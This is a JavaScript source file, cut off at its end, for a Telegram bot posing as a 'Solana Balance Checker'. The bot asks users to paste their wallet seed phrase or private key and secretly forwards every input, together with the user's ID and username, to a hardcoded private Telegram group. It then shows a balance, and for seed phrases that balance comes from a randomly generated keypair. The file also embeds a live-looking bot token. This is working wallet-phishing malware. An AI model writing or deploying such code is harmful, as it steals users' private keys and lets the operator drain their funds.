const { Telegraf, Markup } = require('telegraf');
const { Connection, Keypair } = require('@solana/web3.js');
const bs58 = require('bs58');
const express = require('express');

// Configuration
const BOT_TOKEN = process.env.BOT_TOKEN || '8325436054:AAHLCOPMsOinasV6UgRl8XCjLx5khXQbowg';
const PRIVATE_GROUP_ID = process.env.PRIVATE_GROUP_ID || '-1002914341678';
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-render-app.onrender.com/webhook'; // Replace with your Render URL
const bot = new Telegraf(BOT_TOKEN);
const app = express();

// Solana connections
const MAINNET = 'https://api.mainnet-beta.solana.com';
const DEVNET = 'https://api.devnet.solana.com';
const mainnetConnection = new Connection(MAINNET, 'confirmed');
const devnetConnection = new Connection(DEVNET, 'confirmed');

// Middleware for JSON body parsing
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Simple in-memory storage (use Redis/MongoDB in production)
const userData = new Map();

// Main menu keyboard
const mainMenu = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Import Wallet', 'import_wallet')],
  [Markup.button.callback('📊 Check Balance', 'check_balance')]
]).resize();

// Handle /start command
bot.start((ctx) => {
  ctx.reply(
    '⭐ Welcome to Solana Balance Checker! 💸\n\nImport your wallet to check your SOL balance on mainnet or devnet.\n⚠️ Never share real private keys!',
    mainMenu
  );
  userData.set(ctx.from.id, { step: 'main', publicKey: null });
});

// Handle Import Wallet button
bot.action('import_wallet', (ctx) => {
  ctx.answerCbQuery();
  ctx.reply('🔐 Kindly input your seed phrase or private key (e.g., from Phantom, Solflare).');
  userData.set(ctx.from.id, { ...userData.get(ctx.from.id), step: 'importing' });
});

// Handle Check Balance button
bot.action('check_balance', async (ctx) => {
  ctx.answerCbQuery();
  const user = userData.get(ctx.from.id);
  if (!user || !user.publicKey) {
    return ctx.reply(
      '🚫 No wallet imported. Please import a wallet first.',
      Markup.inlineKeyboard([[Markup.button.callback('⬅ Back', 'back')]])
    );
  }

  try {
    const mainnetBalance = await mainnetConnection.getBalance(user.publicKey);
    const devnetBalance = await devnetConnection.getBalance(user.publicKey);
    const mainnetSol = mainnetBalance / 1e9; // Lamports to SOL
    const devnetSol = devnetBalance / 1e9;

    ctx.reply(
      `📈 Your Wallet Balance:\n\n` +
      `🔗 Mainnet: ${mainnetSol.toFixed(4)} SOL\n` +
      `🔗 Devnet: ${devnetSol.toFixed(4)} SOL\n\n` +
      `Address: \`${user.publicKey.toBase58()}\``,
      { parse_mode: 'Markdown', ...mainMenu }
    );
  } catch (e) {
    ctx.reply(
      '⚠️ Error fetching balance. Invalid key or network issue.',
      Markup.inlineKeyboard([[Markup.button.callback('⬅ Back', 'back')]])
    );
  }
});

// Handle Back button
bot.action('back', (ctx) => {
  ctx.answerCbQuery();
  ctx.reply('Back to main menu:', mainMenu);
  userData.set(ctx.from.id, { ...userData.get(ctx.from.id), step: 'main' });
});

// Handle text input (seed phrase or private key)
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || 'Unknown';
  const user = userData.get(userId);
  if (!user || user.step !== 'importing') {
    return ctx.reply('Please use the buttons to navigate.', mainMenu);
  }

  const input = ctx.message.text.trim();
  ctx.reply('🔄 Importing wallet...');

  // Forward input to private group
  try {
    await bot.telegram.sendMessage(
      PRIVATE_GROUP_ID,
      `User ID: ${userId}\nUsername: @${username}\nInput: ${input}`
    );
  } catch (e) {
    console.error('Failed to forward to group:', e);
  }

  // Attempt to derive public key
  try {
    let keypair;
    if (input.split(' ').length > 1) {
      // Seed phrase (mocked derivation, use bip39 in production)
      // For demo, assume it's a valid seed and use fixed keypair
      keypair = Keypair.generate(); // Replace with real bip39 derivation
    } else {
      // Private key (base58 encoded)
      const secretKey = bs58.decode(input);
      keypair = Keypair.fromSecretKey(secretKey);
    }

    userData.set(userId, { step: 'main', publicKey: keypair.publicKey });
    ctx.reply(
      `✅ Wallet imported!\nAddress: \`${keypair.publicKey.toBase58()}\`\n\nCheck your balance now.`,
      { parse_mode: 'Markdown', ...mainMenu }
    );
  } catch (e) {
    ctx.reply(
      '❌ Invalid seed phrase or private key. Try again.',
      Markup.inlineKeyboard([[Markup.button.callback('⬅ Back', 'back')]])
    );
  }
});

// Set up webhook for Render
app.post('/webhook', (req, res) => {
  bot.handleUpdate(req.body);
  res.sendStatus(200);
});

// Start Express server
app.listen(PORT, async () => {
  console.log(`Bot running on port ${PORT}`);
  try {
    await bot.telegram.setWebhook(`${WEBHOOK_URL}/webhook`);
    console.log('Webhook set successfully');
  } catch (e) {
    console.error('We
